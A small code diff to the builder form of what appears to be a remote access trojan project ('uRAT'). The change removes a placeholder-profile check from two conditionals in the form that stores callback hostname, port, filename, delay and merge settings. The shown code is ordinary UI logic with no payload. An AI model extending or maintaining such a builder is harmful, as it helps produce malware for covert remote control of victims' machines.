@@ -86,7 +86,7 @@ namespace uRAT.Server.Forms
             }
             var settings = new BuildSettings(txtHostname.Text, (int) numPort.Value, txtFilename.Text, path,
                 (int) numDelay.Value, cbMerge.Checked);
-            if (cbProfile.Text == "" || cbProfile.Text == "<Create new...>")
+            if (cbProfile.Text == "")
                 Globals.SettingsHelper.CreateBuilderProfile(
                     PromptDialog.Create("Enter profile name:", "Create new profile"), settings);
             else
@@ -103,7 +103,7 @@ namespace uRAT.Server.Forms
 
         private void cbProfile_SelectedIndexChanged(object sender, EventArgs e)
         {
-            if (cbProfile.SelectedItem.ToString() == "" || cbProfile.SelectedItem.ToString() == "<Create new...>")
+            if (cbProfile.SelectedItem.ToString() == "")
                 return;
             var profile = Globals.SettingsHelper.FetchBuilderProfile(cbProfile.SelectedItem.ToString());
             txtHostname.Text = profile.Hostname;
